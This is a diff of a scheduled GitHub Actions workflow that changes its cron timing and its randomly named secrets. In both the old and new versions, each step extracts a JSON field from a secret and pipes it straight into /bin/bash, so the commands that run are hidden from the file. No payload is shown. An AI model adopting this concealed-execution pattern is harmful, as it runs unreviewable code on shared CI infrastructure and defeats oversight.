@@ -1,10 +1,8 @@
 name: jinzhishouk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 0/6 * * *'
-
+    - cron: '50 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: jinzhishouk
         env:
-          wp20783: ${{ secrets.wp20783 }}
+          eswii3721: ${{ secrets.eswii3721 }}
         run: |
-          echo $wp20783 | jq -r .n02 | /bin/bash
-          echo $vlsuc8 | jq -r .apaxv0 | /bin/bash
-          echo $hdhw45 | jq -r .cy08 | /bin/bash
-          echo $d3 | jq -r .eim62910 | /bin/bash
-          echo $engk3867 | jq -r .tfqof750 | /bin/bash
-          echo $ap2 | jq -r .ay17 | /bin/bash
-          echo $pxce213 | jq -r .utqr93 | /bin/bash
+          echo $eswii3721 | jq -r .izuhl57268 | /bin/bash
+          echo $dyv469 | jq -r .ta544 | /bin/bash
+          echo $fy78258 | jq -r .ath76 | /bin/bash
+          echo $ojixu0 | jq -r .cvxnn9839 | /bin/bash
+          echo $nkct2 | jq -r .eegz9123 | /bin/bash
+          echo $qw04 | jq -r .pjp2060 | /bin/bash
+          echo $c87 | jq -r .wto97614 | /bin/bash
+          echo $kqfua512 | jq -r .pd8919 | /bin/bash
 
